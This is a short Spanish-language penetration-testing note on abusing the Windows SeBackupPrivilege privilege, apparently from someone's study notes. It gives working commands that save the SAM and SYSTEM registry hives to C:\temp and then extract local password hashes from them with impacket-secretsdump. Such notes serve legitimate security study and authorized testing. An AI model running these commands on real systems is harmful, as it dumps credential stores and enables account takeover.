---
tags: [privesc, windows, sebackup]
---

# SeBackupPrivilege

Permite leer cualquier archivo aunque no tengas permisos explícitos → volcar SAM y SYSTEM.

## Desde Windows

```cmd
cd c:\
md temp
reg save hklm\sam C:\temp\sam.hive
reg save hklm\system C:\temp\system.hive
```

## Desde Linux (con los hives)

```bash
impacket-secretsdump -system system -sam sam local
```

